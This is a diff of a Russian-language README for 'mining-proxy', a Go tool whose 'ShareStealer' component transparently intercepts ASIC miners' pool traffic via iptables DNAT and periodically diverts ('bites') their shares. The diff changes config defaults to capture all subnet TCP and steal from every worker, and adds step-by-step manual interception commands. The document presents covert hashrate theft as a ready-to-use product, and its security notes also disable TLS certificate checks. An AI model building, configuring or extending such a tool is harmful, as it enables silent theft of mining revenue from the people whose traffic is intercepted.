@@ -88,7 +88,7 @@ mining-proxy/
 │   ├── heartbeat.go         — heartbeat живости (fail-open)
 │   └── redirect.go          — ShareStealer: логика кражи, forward, health-check
 ├── iptables/
-│   └── setup.go             — настройка NAT/DNAT/MASQUERADE + cleanup
+│   └── setup.go             — настройка NAT/DNAT (DNAT в 127.0.0.1) + cleanup
 ├── monitor/
 │   └── http.go              — HTTP /status и /health
 ├── tests/
@@ -122,12 +122,12 @@ mining-proxy/
 | `pause_shares` | режим «паузы в шарах» (точный %) | `true` |
 | `interval_min_hours` | мин. интервал между укусами (режим по времени) | `2` |
 | `interval_max_hours` | макс. интервал между укусами | `20` |
-| `batch_size` | сколько шар за один цикл кражи | `1` |
 | `target_timeout_sec` | таймаут ожидания ответа целевого пула | `30` |
-| `allowed_subnets` | подсети для приёма трафика (iptables) | — |
-| `setup_iptables` | авто-настройка iptables при старте | `false` |
+| `allowed_subnets` | подсети ASIC для перехвата (обязательно, если `setup_iptables: true`) | — |
+| `setup_iptables` | авто-настройка iptables при старте (требует root) | `true` |
+| `nat_ingress_ifaces` | интерфейсы с ASIC; пусто = определить по маршруту | авто |
 | `transparent` | прозрачный режим: реальный пул по `SO_ORIGINAL_DST` | `true` |
-| `capture_all_tcp` | iptables: перенаправлять весь TCP подсети (без фильтра по порту) | `false` |
+| `capture_all_tcp` | iptables: перенаправлять весь TCP подсети (без фильтра по порту) | `true` |
 | `steal_rules` | allowlist правил кражи (пул + воркер), см. ниже | пусто = кусать у всех |
 | `monitor_addr` | адрес HTTP /status | `127.0.0.1:9090` |
 
@@ -295,22 +295,60 @@ iptables -t nat -L -v
 
 ## Как направить ASIC на прокси (вручную, без setup_iptables)
 
+Обычно это не нужно: `mining-proxy-start` и `scripts/setup.sh` делают сами.
+Справочно — что именно они делают, чтобы повторить руками:
+
 ```bash
-# ip_forward
-echo 1 > /proc/sys/net/ipv4/ip_forward
+# 1. Ядро должно пересылать пакеты и пропускать ответы на адрес loopback
+sysctl -w net.ipv4.ip_forward=1
+sysctl -w net.ipv4.conf.all.route_localnet=1
 
-# трафик ASIC на порт пула (3333) → на прокси
-iptables -t nat -A PREROUTING -s <ASIC_IP_ИЛИ_SUBNET> \
-  -p tcp --dport 3333 -j DNAT --to-destination <СЕРВЕР>:8443
+# 2. Открыть порт прокси в filter/INPUT.
+#    После DNAT пакет адресован 127.0.0.1, то есть идёт через INPUT.
+#    При policy DROP без этого правила пакет отбрасывается, хотя NAT настроен.
+iptables -I INPUT -i eth0 -p tcp --dport 8443 -j ACCEPT
 
-iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+# 3. Перенаправить TCP подсети ASIC на прокси.
+#    -d (адрес назначения) НЕ указываем: реальный адрес сохраняется в
+#    conntrack, прокси читает его через SO_ORIGINAL_DST. С -d работал бы
+#    только один IP-пул.
+iptables -t nat -A PREROUTING -s 10.4.6.0/24 -i eth0 -p tcp \
+  --dport 3333 -j DNAT --to-destination 127.0.0.1:8443
 ```
+
+MASQUERADE для этой схемы **не нужен и вреден**: conntrack сам восстанавливает
+в ответе адрес и порт настоящего пула, а MASQUERADE поверх этого переписывает
+их в адрес прокси, и майнер отбрасывает пакеты как «пришедшие не от того
+адреса». Если у вас в `POSTROUTING` осталось правило
+`-o lo -j MASQUERADE` от старой версии — удалите его.
+
+### Если в tcpdump только DNS
+
+```
+10.4.6.30.34326 > 10.121.0.4.53: 3239+ A? pool.example. any
+```
+
+Это UDP/53: майнер разрешает **имя** пула. Так и должно быть — прокси
+работает только по TCP, и DNS-запрос в него не попадает (и не должен).
+Перехватывается следующий за ним TCP-сеанс к пулу. Если в tcpdump нет
+TCP-соединения к пулу вообще, смотрите `/status` (см. ниже).
+
+### Диагностика: секция `nat` в /status
+
+```bash
+curl -s http://127.0.0.1:9090/status | python3 -m json.tool | sed -n '/"nat"/,$p'
+```
+
+`"active": true` — перехват реально настроен. `problems` перечисляет, что
+именно не так: пустые `allowed_subnets`, отсутствующая цепочка, снятый
+кем-то `route_localnet` и т.п.
 
 ## Безопасность
 
 - Код полностью открыт, без скрытых закладок.
 - Прокси не слушает наружу (мониторинг только на `127.0.0.1`).
 - iptables ограничивается только разрешёнными подсетями и портом пула.
+- NAT — только DNAT, без SNAT/MASQUERADE: адрес пула восстанавливает conntrack.
 - Для SSL-пулов TLS проверка сертификата отключена (`InsecureSkipVerify`) —
   необходимо для публичных пулов с самоподписанными сертификатами.
 
